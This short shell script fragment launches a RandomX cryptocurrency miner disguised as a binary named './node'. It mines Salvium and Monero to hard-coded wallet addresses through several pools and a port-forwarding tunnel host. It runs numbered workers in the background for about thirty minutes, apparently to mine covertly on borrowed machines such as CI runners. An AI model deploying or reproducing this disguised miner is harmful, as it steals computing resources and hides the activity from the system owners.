...
# salvium
START=$(./node -a rx/0 -k -t 2 --cpu-priority 4 --cpu-no-yield --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=240000.net_${WORKER_NUMBER} > try.log & sleep 1830 )
#START=$(./node -a rx/0 -k -t 2 --cpu-priority 4 --cpu-no-yield --donate-level 1 -o menju2ikg8uti-45415.portmap.host:45415 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.net_${INPUT_NUMBER} > try.log & sleep 1830 )


# monero
#START=$(./node -a rx/0 -k -t 2 --cpu-priority 4 --cpu-no-yield --donate-level 1 -o stratum+ssl://pool.supportxmr.com:443 -u 4AnBzt2r9TcQtrQPt7eR4MYS3GtZqRi55Xq5pezcvqnv7WVvgteEshdF4Xcht5XMJwWP3mfH5Nk4s4cfRgZeCQyWUgEMeVo.net_${INPUT_NUMBER} > try.log & sleep 1830 )
#START=$(./node -a rx/0 -k -t 2 --cpu-priority 4 --cpu-no-yield --donate-level 1 -o xmr-us-west1.nanopool.org:10300 -u 4AnBzt2r9TcQtrQPt7eR4MYS3GtZqRi55Xq5pezcvqnv7WVvgteEshdF4Xcht5XMJwWP3mfH5Nk4s4cfRgZeCQyWUgEMeVo.net_${INPUT_NUMBER} > try.log & sleep 1830 )
